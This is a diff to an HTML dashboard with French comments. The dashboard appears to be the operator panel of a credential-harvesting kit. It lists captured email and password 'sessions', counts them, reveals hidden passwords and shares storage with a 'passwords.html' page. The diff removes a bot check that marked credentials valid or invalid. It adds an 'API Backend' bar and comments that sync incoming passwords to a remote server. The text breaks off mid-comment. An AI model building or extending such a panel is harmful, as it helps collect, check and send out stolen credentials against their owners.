@@ -153,6 +153,110 @@
 
   .last-sync strong { color:var(--text); font-weight:600; }
 
+  /* ====== BARRE API BACKEND ====== */
+  .api-bar {
+    display:flex;
+    align-items:center;
+    gap:10px;
+    padding:12px 16px;
+    background:var(--card);
+    backdrop-filter:blur(20px);
+    border:1px solid var(--border);
+    border-radius:14px;
+    margin-bottom:20px;
+    flex-wrap:wrap;
+    animation:fadeUp 0.65s ease;
+    transition:border-color 0.3s;
+  }
+
+  .api-bar.connected { border-color:rgba(16,185,129,0.4); background:linear-gradient(135deg, rgba(16,185,129,0.06), var(--card)); }
+  .api-bar.error { border-color:rgba(239,68,68,0.4); }
+
+  .api-icon {
+    width:32px; height:32px;
+    border-radius:9px;
+    background:rgba(99,102,241,0.15);
+    color:var(--primary-glow);
+    display:grid; place-items:center;
+    flex-shrink:0;
+    transition:all 0.3s;
+  }
+  .api-bar.connected .api-icon { background:rgba(16,185,129,0.15); color:var(--success); }
+  .api-bar.error .api-icon { background:rgba(239,68,68,0.15); color:var(--danger); }
+
+  .api-icon svg { width:16px; height:16px; }
+
+  .api-info {
+    flex:1;
+    min-width:200px;
+    display:flex;
+    flex-direction:column;
+    gap:2px;
+  }
+
+  .api-label {
+    font-size:11px;
+    text-transform:uppercase;
+    letter-spacing:1.2px;
+    color:var(--muted);
+    font-weight:700;
+  }
+
+  .api-status {
+    font-size:13px;
+    color:var(--text);
+    font-weight:600;
+    display:flex;
+    align-items:center;
+    gap:8px;
+  }
+
+  .api-url-input {
+    flex:1;
+    min-width:220px;
+    padding:10px 14px;
+    background:rgba(0,0,0,0.3);
+    border:1px solid var(--border);
+    border-radius:10px;
+    color:var(--text);
+    font-size:13px;
+    outline:none;
+    font-family:'JetBrains Mono', monospace;
+    transition:all 0.3s;
+  }
+
+  .api-url-input:focus {
+    border-color:var(--primary);
+    box-shadow:0 0 0 4px rgba(99,102,241,0.15);
+  }
+
+  .api-btn {
+    padding:10px 16px;
+    border-radius:10px;
+    border:none;
+    background:linear-gradient(135deg, #6366f1, #8b5cf6);
+    color:white;
+    font-size:13px;
+    font-weight:700;
+    cursor:pointer;
+    transition:all 0.2s;
+    font-family:inherit;
+    white-space:nowrap;
+  }
+
+  .api-btn:hover { transform:translateY(-1px); box-shadow:0 6px 20px rgba(99,102,241,0.4); }
+  .api-btn:active { transform:translateY(0); }
+
+  .api-btn.disconnect {
+    background:rgba(239,68,68,0.15);
+    color:#f87171;
+  }
+
+  .api-btn.disconnect:hover {
+    background:rgba(239,68,68,0.25);
+    box-shadow:none;
+  }
+
   /* ====== STATS ====== */
   .stats {
     display:grid;
@@ -209,12 +313,12 @@
     font-weight:600;
   }
 
-  .stat.total { --accent:var(--primary); --accent-from:#818cf8; --accent-to:#a78bfa; }
-  .stat.emails { --accent:#06b6d4; --accent-from:#22d3ee; --accent-to:#06b6d4; }
-  .stat.passwords { --accent:#f59e0b; --accent-from:#fbbf24; --accent-to:#f59e0b; }
-  .stat.complete { --accent:#8b5cf6; --accent-from:#a78bfa; --accent-to:#8b5cf6; }
-  .stat.valid { --accent:var(--success); --accent-from:#34d399; --accent-to:#10b981; }
-  .stat.invalid { --accent:var(--danger); --accent-from:#f87171; --accent-to:#ef4444; }
+  .stat.total { --accent-from:#818cf8; --accent-to:#a78bfa; }
+  .stat.emails { --accent-from:#22d3ee; --accent-to:#06b6d4; }
+  .stat.passwords { --accent-from:#fbbf24; --accent-to:#f59e0b; }
+  .stat.complete { --accent-from:#a78bfa; --accent-to:#8b5cf6; }
+  .stat.valid { --accent-from:#34d399; --accent-to:#10b981; }
+  .stat.invalid { --accent-from:#f87171; --accent-to:#ef4444; }
 
   /* ====== TABS CATÉGORIES ====== */
   .tabs {
@@ -320,38 +424,6 @@
     height:16px;
     color:var(--muted);
     pointer-events:none;
-  }
-
-  .filters {
-    display:flex;
-    gap:6px;
-    padding:6px;
-    background:var(--card);
-    backdrop-filter:blur(20px);
-    border:1px solid var(--border);
-    border-radius:12px;
-  }
-
-  .filter-btn {
-    padding:8px 16px;
-    border-radius:8px;
-    background:transparent;
-    border:none;
-    color:var(--muted);
-    cursor:pointer;
-    font-size:13px;
-    font-weight:600;
-    transition:all 0.2s;
-    white-space:nowrap;
-    font-family:inherit;
-  }
-
-  .filter-btn:hover { color:var(--text); }
-
-  .filter-btn.active {
-    background:linear-gradient(135deg, #6366f1, #8b5cf6);
-    color:white;
-    box-shadow:0 4px 12px rgba(99,102,241,0.4);
   }
 
   .refresh-btn {
@@ -480,8 +552,8 @@
   }
 
   .session-row .value.email { color:#22d3ee; }
-  .session-row .value.password { color:#fbbf24; }
-  .session-row .value.password.revealed { color:#f87171; }
+  .session-row .value.password { color:#fbbf24; letter-spacing:1px; }
+  .session-row .value.password.revealed { color:#f87171; letter-spacing:0; }
 
   .session-row .value.empty {
     color:var(--muted);
@@ -698,6 +770,30 @@
     </div>
   </header>
 
+  <!-- ============ BARRE API BACKEND ============ -->
+  <div class="api-bar" id="api-bar">
+    <div class="api-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M5 12.55a11 11 0 0 1 14.08 0"></path>
+        <path d="M1.42 9a16 16 0 0 1 21.16 0"></path>
+        <path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path>
+        <line x1="12" y1="20" x2="12.01" y2="20"></line>
+      </svg>
+    </div>
+    <div class="api-info">
+      <div class="api-label">API Backend</div>
+      <div class="api-status" id="api-status">Mode local (localStorage) — non connecté</div>
+    </div>
+    <input
+      type="text"
+      class="api-url-input"
+      id="api-url-input"
+      placeholder="https://ton-api.com/api/sessions"
+      value=""
+    >
+    <button class="api-btn" id="api-connect-btn">Connecter</button>
+  </div>
+
   <!-- ============ STATS ============ -->
   <div class="stats">
     <div class="stat total">
@@ -782,16 +878,33 @@
 
 <script>
 /* ============================================================
-   🌐 CONFIGURATION
+   🌐 CONFIGURATION GLOBALE
    ============================================================ */
-const STORAGE_KEY = 'locker_sessions'; // même clé que passwords.html
-const POLL_INTERVAL = 2000;            // ms
+const STORAGE_KEY = 'locker_sessions';       // clé localStorage partagée avec passwords.html
+const API_STORAGE_KEY = 'locker_api_url';    // mémorise l'URL API
+const POLL_INTERVAL = 2000;                  // ms
 
 /* ============================================================
-   🔌 API LAYER — lecture/écriture localStorage
+   📡 ÉTAT DE L'API
+   ============================================================
+   Si API_ENABLED = true, le dashboard lira/écrira via l'API.
+   Sinon, il utilisera localStorage (mode local).
+   Les mots de passe arrivent TOUJOURS via localStorage d'abord,
+   puis sont synchronisés avec l'API si elle est connectée.
+   ============================================================ */
+let API_ENABLED = false;
+let API_URL = '';
+let API_CONNECTED = false;
+
+/* ============================================================
+   🔌 API LAYER — Interface unifiée
+   ============================================================
+   Le dashboard utilise ces fonctions. Elles basculent
+   automatiquement entre localStorage et l'API backend.
    ============================================================ */
 
-function loadSessions() {
+// Charge les sessions depuis localStorage
+function loadLocal() {
   try {
     const raw = localStorage.getItem(STORAGE_KEY);
     const sessions = raw ? JSON.parse(raw) : [];
@@ -799,145 +912,4 @@ function loadSessions() {
   } catch (e) {
     console.error('Erreur lecture localStorage:', e);
     return [];
-  }
-}
-
-function saveSessions(sessions) {
-  try {
-    localStorage.setItem(STORAGE_KEY, JSON.stringify(sessions));
-  } catch (e) {
-    console.error('Erreur écriture localStorage:', e);
-  }
-}
-
-async function getSessions() { return loadSessions(); }
-
-async function updateStatus(id, status) {
-  const sessions = loadSessions();
-  const s = sessions.find(x => x.id === id);
-  if (s) {
-    s.status = status;
-    saveSessions(sessions);
-  }
-  return { ok: true };
-}
-
-async function deleteSession(id) {
-  const sessions = loadSessions().filter(x => x.id !== id);
-  saveSessions(sessions);
-  return { ok: true };
-}
-
-async function runBotVerify(id) {
-  await new Promise(r => setTimeout(r, 1200));
-  const sessions = loadSessions();
-  const s = sessions.find(x => x.id === id);
-  if (!s) return 'invalid';
-
-  const isValid = !!(s.email && s.email.includes('@') && s.password && s.password.length >= 6);
-
-  if (isValid) {
-    s.status = 'valid';
-    saveSessions(sessions);
-    return 'valid';
-  } else {
-    s.status = 'invalid';
-    saveSessions(sessions);
-    return 'invalid';
-  }
-}
-
-/* ============================================================
-   🎨 FOND PARTICULES
-   ============================================================ */
-const canvas = document.getElementById('bg-canvas');
-const ctx = canvas.getContext('2d');
-let particles = [];
-let mouse = { x: -9999, y: -9999 };
-
-function resizeCanvas() {
-  canvas.width = window.innerWidth;
-  canvas.height = window.innerHeight;
-}
-
-class Particle {
-  constructor() {
-    this.x = Math.random() * canvas.width;
-    this.y = Math.random() * canvas.height;
-    this.vx = (Math.random() - 0.5) * 0.35;
-    this.vy = (Math.random() - 0.5) * 0.35;
-    this.r = Math.random() * 1.6 + 0.6;
-  }
-  update() {
-    this.x += this.vx;
-    this.y += this.vy;
-    if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
-    if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
-
-    const dx = mouse.x - this.x;
-    const dy = mouse.y - this.y;
-    const d = Math.hypot(dx, dy);
-    if (d < 130) {
-      const f = (130 - d) / 130;
-      this.x -= (dx / d) * f * 1.2;
-      this.y -= (dy / d) * f * 1.2;
-    }
-  }
-  draw() {
-    ctx.beginPath();
-    ctx.arc(this.x, this.y, this.r, 0, Math.PI * 2);
-    ctx.fillStyle = 'rgba(129, 140, 248, 0.7)';
-    ctx.fill();
-  }
-}
-
-function initParticles() {
-  particles = [];
-  const count = Math.min(70, Math.floor(window.innerWidth / 18));
-  for (let i = 0; i < count; i++) particles.push(new Particle());
-}
-
-function animateParticles() {
-  ctx.clearRect(0, 0, canvas.width, canvas.height);
-
-  for (let i = 0; i < particles.length; i++) {
-    for (let j = i + 1; j < particles.length; j++) {
-      const dx = particles[i].x - particles[j].x;
-      const dy = particles[i].y - particles[j].y;
-      const d = Math.hypot(dx, dy);
-      if (d < 130) {
-        ctx.beginPath();
-        ctx.moveTo(particles[i].x, particles[i].y);
-        ctx.lineTo(particles[j].x, particles[j].y);
-        ctx.strokeStyle = `rgba(99, 102, 241, ${(1 - d / 130) * 0.5})`;
-        ctx.lineWidth = 0.5;
-        ctx.stroke();
-      }
-    }
-  }
-
-  particles.forEach(p => { p.update(); p.draw(); });
-  requestAnimationFrame(animateParticles);
-}
-
-window.addEventListener('resize', () => { resizeCanvas(); initParticles(); });
-window.addEventListener('mousemove', e => { mouse.x = e.clientX; mouse.y = e.clientY; });
-window.addEventListener('mouseleave', () => { mouse.x = -9999; mouse.y = -9999; });
-
-resizeCanvas();
-initParticles();
-animateParticles();
-
-/* ============================================================
-   🎯 ÉTAT DU DASHBOARD
-   ============================================================ */
-let allSessions = [];
-let currentCategory = 'all';
-let currentSearch = '';
-const revealedPasswords = new Set(); // ids des mdp révélés
-
-/* ============================================================
-   🏷️ CATÉGORISATION D'UNE SESSION
-   ============================================================ */
-function getCategory(session) {
-  // Prior
+ 
